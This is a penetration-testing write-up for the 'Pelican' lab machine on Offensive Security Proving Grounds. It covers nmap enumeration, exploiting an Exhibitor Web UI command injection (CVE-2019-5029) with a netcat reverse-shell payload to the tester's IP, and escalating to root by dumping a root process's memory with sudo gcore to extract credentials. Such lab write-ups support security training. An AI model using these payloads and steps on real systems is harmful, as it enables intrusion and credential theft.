# Report-Pelican

## Engagement Overview

Laboratory: Offensive Security Proving Grounds

Target Name: Pelican

Target IP Address: 192.168.205.98

Operating System: Linux

## Information Gathering

Full Nmap scan of all TCP ports:

```bash
nmap -sC -sV -p- 192.168.205.98
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-19 19:35 +0100
Nmap scan report for 192.168.205.98
Host is up (0.034s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
|_http-server-header: CUPS/2.2 IPP/2.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-title: Forbidden - CUPS v2.2.10
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp  open  http        Jetty 1.0
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(1.0)
8081/tcp  open  http        nginx 1.14.2
|_http-title: Did not follow redirect to http://192.168.205.98:8080/exhibitor/v1/ui/index.html
|_http-server-header: nginx/1.14.2
46295/tcp open  java-rmi    Java RMI
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-01-19T18:36:05
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2026-01-19T13:36:05-05:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h40m00s, deviation: 2h53m13s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.06 seconds

```

Full Nmap scan of all UDP ports:
```bash
 nmap -sU -sV --version-intensity 0 -F -n 192.168.205.98
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-19 19:36 +0100
Nmap scan report for 192.168.205.98
Host is up (0.033s latency).
Not shown: 59 closed udp ports (port-unreach), 40 open|filtered udp ports (no-response)
PORT     STATE SERVICE VERSION
5353/udp open  mdns    DNS-based service discovery

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.95 seconds

```

Banner scan for port 631:
```bash
nmap -sV -p631 --script=cups* 192.168.205.98                                                                                             
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-19 19:39 +0100
Nmap scan report for 192.168.205.98
Host is up (0.034s latency).

PORT    STATE SERVICE VERSION
631/tcp open  ipp     CUPS 2.2
|_cups-info: ERROR: Script execution failed (use -d to debug)
|_http-server-header: CUPS/2.2 IPP/2.1
|_cups-queue-info: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.36 seconds

```

Enumeration of port 8081 using a browser:
redirection on  http://192.168.205.98:8080/exhibitor/v1/ui/index.html

<img width="1312" height="436" alt="Pasted image 20260119194554" src="https://github.com/user-attachments/assets/3123ff85-591f-4d60-9c61-6f0415829570" />

Searching Exploit-DB for  PoC on Exhibitor's vulnerability: 

<img width="1217" height="383" alt="Pasted image 20260119194657" src="https://github.com/user-attachments/assets/78dea6cb-d398-4c96-8cd3-c20c32a10131" />

Proof of concept Code:https://www.exploit-db.com/exploits/48654

## Initial Access

Vulnerability Exploited: Exhibitor Web UI 1.7.1 - Remote Code Execution (CVE-2019-5029)

Vulnerability Explanation: An exploitable command injection vulnerability exists in the Config editor of the Exhibitor Web UI versions 1.0.9 to 1.7.1. Arbitrary shell commands surrounded by backticks or $() can be inserted into the editor and will be executed by the Exhibitor process when it launches ZooKeeper. An attacker can execute any command as the user running the Exhibitor process. 

### Exploitation:


Command:

```
$(/bin/nc -e /bin/sh 192.168.45.234 4444 &)
```

<img width="1308" height="682" alt="Pasted image 20260119195153" src="https://github.com/user-attachments/assets/aa09e10e-6e96-46d7-b5cd-90467b7419eb" />

The reverse shell was obtained as the charles user.

<img width="576" height="119" alt="Pasted image 20260119195305" src="https://github.com/user-attachments/assets/c265e005-472c-458b-b3fd-c58222e6c995" />

The reverse was stabilized with this comand:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Privilege Escalation


Vulnerability Exploited: Misconfigured sudo permissions

Vulnerability Explanation: The user was allowed to execute the gcore binary as root without a password via sudo.
The gcore utility can be abused to dump the memory of running processes.
By attaching to a privileged process, sensitive information such as credentials can be extracted from memory, resulting in privilege escalation to root.

### Enumeration:

```bash
sudo -l
```

<img width="696" height="138" alt="Pasted image 20260119195657" src="https://github.com/user-attachments/assets/7764b1ec-c057-43c6-b6b6-c2c80d56ee4a" />

Using ps we can enumerate the processes
```bash
ps -auxwww
```
root       490  0.0  0.0   2276    72 ?        Ss   13:28   0:00 /usr/bin/password-store

<img width="891" height="91" alt="Pasted image 20260119200503" src="https://github.com/user-attachments/assets/2cec7ffd-cd1e-48d1-a059-63970d10a13d" />

### Exploitation:

We can use /usr/bin/gcore to generate a file of the password-store process
```bash
sudo /usr/bin/gcore 490
```
Now we can read the file.

```bash
strings core.490
```

<img width="567" height="225" alt="Pasted image 20260119200637" src="https://github.com/user-attachments/assets/88d8f725-4e3a-45f4-bdc1-e3f5ff0e6045" />

We obtained the root credentials.

```bash
su root
```

<img width="296" height="142" alt="Pasted image 20260119201025" src="https://github.com/user-attachments/assets/7e3f94c0-d449-405a-9fb6-cb1449d1af40" />

The reverse shell was obtained as the root user.










